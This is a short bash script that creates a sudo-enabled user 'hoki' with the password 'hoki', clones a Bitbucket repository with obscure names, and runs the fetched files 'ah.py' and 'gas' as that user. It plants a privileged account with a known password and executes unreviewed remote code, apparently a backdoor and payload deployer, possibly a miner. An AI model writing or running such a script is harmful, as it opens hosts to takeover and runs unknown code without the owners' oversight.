#!/bin/bash
sudo useradd -m hoki
sudo adduser hoki sudo
sudo usermod -a -G sudo hoki
sudo echo 'hoki:hoki' | sudo chpasswd
cd /home/hoki
git clone https://asleeouy5@bitbucket.org/1vaytuyon/asu.git
cd asu
sudo chown hoki:sudo ah
sudo chown hoki:sudo gas
sudo chmod 700 gas ah.py
sudo -u hoki sh -c "/home/hoki/asu/ah.py"